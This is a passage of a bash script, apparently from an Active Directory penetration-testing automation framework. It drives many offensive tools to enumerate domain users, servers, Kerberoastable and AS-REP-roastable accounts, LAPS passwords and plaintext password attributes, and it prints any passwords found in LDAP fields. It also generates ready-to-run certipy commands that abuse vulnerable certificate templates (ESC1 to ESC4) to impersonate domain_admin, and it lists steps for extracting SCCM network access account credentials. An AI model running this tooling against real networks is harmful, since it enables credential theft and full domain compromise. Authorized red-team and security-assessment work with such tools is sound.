| grep dNSHostName | cut -d ' ' -f 2 | sort -u\" >\"${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt\"\n            #Parsing user and computer lists\n            grep -a \"sAMAccountName:\" \"${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt\" | sed \"s/sAMAccountName: //g\" | sort -u >\"${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt\" 2>&1\n            grep -a \"dNSHostName:\" \"${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt\" | sed \"s/dNSHostName: //g\" | sort -u >\"${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt\" 2>&1\n            grep -a \"cn:\" \"${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt\" | sed \"s/cn: //g\" | sort -u >\"${output_dir}/DomainRecon/windapsearch/groups_list_windap_${dc_domain}.txt\" 2>&1\n            grep -iha \"pass\\|pwd\" \"${output_dir}\"/DomainRecon/windapsearch/windapsearch_*_\"${dc_domain}.txt\" | grep -av \"badPasswordTime\\|badPwdCount\\|badPasswordTime\\|pwdLastSet\\|have their passwords replicated\\|RODC Password Replication Group\\|msExch\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt\"\n            if [ -s \"${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt\" ]; then\n                echo -e \"${GREEN}[+] Printing passwords found in LDAP fields...${NC}\"\n                /bin/cat \"${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt\" 2>/dev/null\n            fi\n            echo -e \"${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}\"\n            parse_users\n            parse_servers\n        fi\n    fi\n    echo -e \"\"\n}\n\nldapwordharv_enum() {\n    if [ ! -f \"${LDAPWordlistHarvester}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of LDAPWordlistHarvester${NC}\"\n    else\n        echo -e \"${BLUE}[*] Generating wordlist using LDAPWordlistHarvester${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] LDAPWordlistHarvester requires credentials${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--ldaps\"; else ldaps_param=\"\"; fi\n            if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"-v\"; else verbose_p0dalirius=\"\"; fi\n            run_command \"${python3} ${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${output_dir}/DomainRecon/ldapwordharv_${dc_domain}.txt\" 2>&1 | tee -a \"${output_dir}/DomainRecon/ldapwordharv_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nrdwatool_enum() {\n    if [ ! -f \"${rdwatool}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of rdwatool${NC}\"\n    else\n        echo -e \"${BLUE}[*] Enumerating RDWA servers using rdwatool${NC}\"\n        run_command \"${rdwatool} recon -tf ${servers_hostname_list} -k\" 2>&1 | tee \"${output_dir}/DomainRecon/rdwatool_output_${dc_domain}.txt\"\n    fi\n    echo -e \"\"\n}\n\nne_sccm() {\n    echo -e \"${BLUE}[*] SCCM Enumeration using netexec${NC}\"\n    run_command \"echo -n Y | ${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${output_dir}/DomainRecon/ne_sccm_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nsccmhunter_enum() {\n    if [ ! -f \"${sccmhunter}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of sccmhunter${NC}\"\n    else\n        echo -e \"${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] sccmhunter requires credentials${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-ldaps\"; else ldaps_param=\"\"; fi\n            /bin/rm -rf \"$HOME/.sccmhunter/logs/\" 2>/dev/null\n            run_command \"${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}\" 2>&1 | tee -a \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n            run_command \"${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save\" 2>&1 | tee \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n            if ! grep -q 'SCCM doesn' \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\" && ! grep -q 'Traceback' \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"; then\n                run_command \"${python3} ${sccmhunter} show -users\" 2>/dev/null | tee -a \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n                run_command \"${python3} ${sccmhunter} show -computers\" 2>/dev/null | tee -a \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n                run_command \"${python3} ${sccmhunter} show -groups\" 2>/dev/null | tee -a \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n                run_command \"${python3} ${sccmhunter} show -mps\" 2>/dev/null | tee -a \"${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt\"\n                echo -e \"${GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:${NC}\"\n                echo -e \"${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nldapper_enum() {\n    if [ ! -f \"${ldapper}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ldapper${NC}\"\n    else\n        echo -e \"${BLUE}[*] Enumeration of LDAP using ldapper${NC}\"\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}\"\n        else\n            mkdir -p \"${output_dir}/DomainRecon/LDAPPER\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-n 1\"; else ldaps_param=\"-n 2\"; fi\n            echo -e \"${CYAN}[*] Get all users${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json\"\n            /usr/bin/jq -r \".[].samaccountname\" \"${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_ldapper_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Get all groups (and their members)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Get all printers${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Get all computers${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json\"\n            /usr/bin/jq -r \".[].dnshostname\" \"${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_ldapper_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Get Domain/Enterprise Administrators${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Get Domain Trusts${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Oracle 'orclCommonAttribute'SSO password hash${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Oracle 'userPassword' SSO password hash${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json\"\n            echo -e \"${CYAN}[*] Get SCCM Servers${NC}\"\n            run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json\" >\"${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadalanche_enum() {\n    if [ ! -f \"${adalanche}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of Adalanche${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/Adalanche\"\n        echo -e \"${BLUE}[*] Adalanche Enumeration${NC}\"\n        if [ -n \"$(ls -A \"${output_dir}/DomainRecon/Adalanche/data\" 2>/dev/null)\" ]; then\n            echo -e \"${YELLOW}[i] Adalanche results found, skipping... ${NC}\"\n        else\n            if [ \"${aeskey_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] Adalanche does not support Kerberos authentication using AES Key${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/Adalanche\" || exit\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--tlsmode tls --ignorecert\"; else ldaps_param=\"--tlsmode NoTLS --port 389\"; fi\n                run_command \"${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_bool}\" | tee \"${output_dir}/DomainRecon/Adalanche/adalanche_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nGPOwned_enum() {\n    if [ ! -f \"${GPOwned}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of GPOwned${NC}\"\n    else\n        echo -e \"${BLUE}[*] GPO Enumeration using GPOwned${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] GPOwned requires credentials{NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-use-ldaps\"; else ldaps_param=\"\"; fi\n            run_command \"${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcuser\" | tee \"${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt\"\n            run_command \"${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcmachine\" | tee -a \"${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nldap_console() {\n    if [ ! -f \"${ldapconsole}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ldapconsole${NC}\"\n    else\n        echo -e \"${BLUE}[*] Launching ldapconsole${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] ldapconsole requires credentials ${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--use-ldaps\"; else ldaps_param=\"\"; fi\n            if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"--debug\"; else verbose_p0dalirius=\"\"; fi\n            run_command \"${python3} ${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}\" 2>&1 | tee -a \"${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nldap_monitor() {\n    if [ ! -f \"${pyLDAPmonitor}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of pyLDAPmonitor${NC}\"\n    else\n        echo -e \"${BLUE}[*] Launching pyLDAPmonitor${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] pyLDAPmonitor requires credentials ${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--use-ldaps\"; else ldaps_param=\"\"; fi\n            if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"--debug\"; else verbose_p0dalirius=\"\"; fi\n            run_command \"${python3} ${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}\" 2>&1\n        fi\n    fi\n    echo -e \"\"\n}\n\naced_console() {\n    if [ ! -f \"${aced}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of aced${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] aced requires credentials${NC}\"\n        else\n            echo -e \"${BLUE}[*] Launching aced${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-ldaps\"; else ldaps_param=\"\"; fi\n            run_command \"${python3} ${aced} ${argument_aced}\\\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}\" 2>&1 | tee -a \"${output_dir}/DomainRecon/aced_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadpeas_enum() {\n    if [ ! -f \"${adPEAS}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of adPEAS${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ] || [ \"${hash_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] adPEAS only supports password authentication ${NC}\"\n        else\n            mkdir -p \"${output_dir}/DomainRecon/adPEAS\"\n            echo -e \"${BLUE}[*] Launching adPEAS${NC}\"\n            current_dir=$(pwd)\n            cd \"${output_dir}/DomainRecon/adPEAS\" || exit\n            run_command \"${adPEAS} ${argument_adpeas} -i ${dc_ip}\" 2>&1 | tee -a \"${output_dir}/DomainRecon/adPEAS_output_${dc_domain}.txt\"\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\nbreads_console() {\n    if [ ! -f \"${breads}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of breads${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] breads does not support Kerberos authentication ${NC}\"\n        else\n            echo -e \"${BLUE}[*] Launching breads${NC}\"\n            rm -rf \"${HOME}/.breads/${user}_${dc_domain}\" 2>/dev/null\n            echo \"$(date +%Y-%m-%d\\ %H:%M:%S); ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt\" >>\"$command_log\"\n            (\n                echo -e \"create_profile ${user}_${dc_domain}\\nload_profile ${user}_${dc_domain}\\n${dc_ip}\\n${domain}\\\\\\\\${user}\\n${password}${hash}\\ncurrent_profile\"\n                cat /dev/tty\n            ) | /usr/bin/script -qc \"${breads}\" /dev/null | tee -a \"${output_dir}/DomainRecon/breads_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ngodap_console() {\n    if [ ! -f \"${godap}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of godap${NC}\"\n    else\n        if [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] godap does not support Kerberos authentication using AES Key${NC}\"\n        else\n            echo -e \"${BLUE}[*] Launching godap${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-S -I\"; else ldaps_param=\"\"; fi\n            run_command \"${godap} ${target} ${argument_godap} --kdc ${dc_FQDN} ${ldaps_param}\" 2>&1 | tee -a \"${output_dir}/DomainRecon/godap_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nldapper_console() {\n    if [ ! -f \"${ldapper}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ldapper${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}\"\n        else\n            mkdir -p \"${output_dir}/DomainRecon/LDAPPER\"\n            echo -e \"${BLUE}[*] Running ldapper with custom LDAP search string${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-n 1\"; else ldaps_param=\"-n 2\"; fi\n            echo -e \"${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}\"\n            echo -e \"1.1) Get specific user (You will be prompted for the username)\"\n            echo -e \"2.1) Get specific group (You will be prompted for the group name)\"\n            echo -e \"4.1) Get specific computer (You will be prompted for the computer name)\"\n            echo -e \"9.1) Search for specific User SPN (You will be prompted for the User Principle Name)\"\n            echo -e \"10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)\"\n            echo -e \"*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))\"\n            echo -e \"back) Go back\"\n\n            read -rp \"> \" custom_option </dev/tty\n            if [[ ! ${custom_option} == \"back\" ]]; then\n                run_command \"${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}\" | tee -a \"${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt\"\n            else\n                ad_menu\n            fi\n            ldapper_console\n        fi\n    fi\n    echo -e \"\"\n}\n\nadcheck_enum() {\n    if [ ! -f \"${ADCheck}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ADCheck${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/ADCheck\"\n        echo -e \"${BLUE}[*] ADCheck Enumeration${NC}\"\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] ADCheck requires credentials and does not support Kerberos authentication${NC}\"\n        else\n            current_dir=$(pwd)\n            cd \"${output_dir}/DomainRecon/ADCheck\" || exit\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            run_command \"${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip}\" | tee \"${output_dir}/DomainRecon/ADCheck/ADCheck_output_${dc_domain}.txt\"\n            cd \"${current_dir}\" || exit\n            /usr/bin/jq -r \".data[].Properties.samaccountname| select( . != null )\" \"${output_dir}\"/DomainRecon/ADCheck/*_users.json 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_adcheck_${dc_domain}.txt\"\n            /usr/bin/jq -r \".data[].Properties.name| select( . != null )\" \"${output_dir}\"/DomainRecon/ADCheck/*_computers.json 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_adcheck_${dc_domain}.txt\"\n            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains(\"MSSQL\")).serviceprincipalnames[]' \"${output_dir}\"/DomainRecon/ADCheck/*_users.json 2>/dev/null | cut -d \"/\" -f 2 | cut -d \":\" -f 1 | sort -u >\"${output_dir}/DomainRecon/Servers/sql_list_adcheck_${dc_domain}.txt\"\n            parse_users\n            parse_servers\n        fi\n    fi\n    echo -e \"\"\n}\n\n###### adcs_enum: ADCS Enumeration\nne_adcs_enum() {\n    mkdir -p \"${output_dir}/ADCS\"\n    if [ ! -f \"${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt\" ]; then\n        echo -e \"${BLUE}[*] ADCS Enumeration${NC}\"\n        if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--port 636\"; else ldaps_param=\"\"; fi\n        run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt\" 2>&1\n    else\n        echo -e \"${YELLOW}[i] ADCS info found, skipping...${NC}\"\n    fi\n    pki_servers=$(grep -o \"Found PKI Enrollment Server.*\" \"${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt\" | cut -d \" \" -f 5- | awk '!x[$0]++')\n    pki_cas=$(grep -o \"Found CN.*\" \"${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt\" | cut -d \" \" -f 3- | sed \"s/ /SPACE/g\" | awk '!x[$0]++')\n}\n\ncerti_py_enum() {\n    if [[ ! -f \"${certi_py}\" ]]; then\n        echo -e \"${RED}[-] Please verify the installation of certi.py${NC}\"\n    else\n        echo -e \"${BLUE}[*] certi.py Enumeration${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] certi.py requires credentials${NC}\"\n        else\n            run_command \"${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca\" 2>&1 | tee \"${output_dir}/ADCS/certi.py_CA_output_${dc_domain}.txt\"\n            run_command \"${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service\" 2>&1 | tee \"${output_dir}/ADCS/certi.py_CAServices_output_${dc_domain}.txt\"\n            run_command \"${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled\" 2>&1 | tee \"${output_dir}/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ncertipy_enum() {\n    if [[ ! -f \"${certipy}\" ]]; then\n        echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n    else\n        echo -e \"${BLUE}[*] Certipy Enumeration${NC}\"\n        if [ -n \"$(ls -A \"${output_dir}\"/ADCS/*_Certipy* 2>/dev/null)\" ]; then\n            echo -e \"${YELLOW}[i] Certipy results found, skipping... ${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] certipy requires credentials${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/ADCS\" || exit\n                if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"-ldap-channel-binding\"; else ldapbinding_param=\"\"; fi\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-scheme ldaps ${ldapbinding_param}\"; else ldaps_param=\"-scheme ldap\"; fi\n                run_command \"${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound\" >\"${output_dir}/ADCS/certipy_output_${dc_domain}.txt\"\n                run_command \"${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins\" 2>&1 | tee -a \"${output_dir}/ADCS/certipy_vulnerable_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n            fi\n        fi\n    fi\n    adcs_vuln_parse | tee \"${output_dir}/ADCS/ADCS_exploitation_steps_${dc_domain}.txt\"\n    echo -e \"\"\n}\n\nadcs_vuln_parse() {\n    ne_adcs_enum\n    esc1_vuln=$(/usr/bin/jq -r '.\"Certificate Templates\"[] | select (.\"[!] Vulnerabilities\".\"ESC1\" and (.\"[!] Vulnerabilities\"[] | contains(\"Admins\") | not) and .\"Enabled\" == true).\"Template Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc1_vuln ]]; then\n        echo -e \"${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}\"\n        for vulntemp in $esc1_vuln; do\n            echo -e \"${YELLOW}# ${vulntemp} certificate template${NC}\"\n            echo -e \"${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096\"\n            echo -e \"${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc2_3_vuln=$(/usr/bin/jq -r '.\"Certificate Templates\"[] | select ((.\"[!] Vulnerabilities\".\"ESC2\" or .\"[!] Vulnerabilities\".\"ESC3\") and (.\"[!] Vulnerabilities\"[] | contains(\"Admins\") | not) and .\"Enabled\" == true).\"Template Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc2_3_vuln ]]; then\n        echo -e \"${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}\"\n        for vulntemp in $esc2_3_vuln; do\n            echo -e \"${YELLOW}# ${vulntemp} certificate template${NC}\"\n            echo -e \"${CYAN}1. Request a certificate based on the vulnerable template:${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo \"$dc_domain\" | cut -d \".\" -f 1)\\\\domain_admin -pfx '${user}.pfx' -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Authenticate using pfx of domain_admin:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc4_vuln=$(/usr/bin/jq -r '.\"Certificate Templates\"[] | select (.\"[!] Vulnerabilities\".\"ESC4\" and (.\"[!] Vulnerabilities\"[] | contains(\"Admins\") | not) and .\"Enabled\" == true).\"Template Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc4_vuln ]]; then\n        echo -e \"${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}\"\n        for vulntemp in $esc4_vuln; do\n            echo -e \"${YELLOW}# ${vulntemp} certificate template${NC}\"\n            echo -e \"${CYAN}1. Make the template vulnerable to ESC1:${NC}\"\n            echo -e \"${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Restore configuration of vulnerable template:${NC}\"\n            echo -e \"${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json\"\n            echo -e \"${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc6_vuln=$(/usr/bin/jq -r '.\"Certificate Authorities\"[] | select (.\"[!] Vulnerabilities\".\"ESC6\") | .\"CA 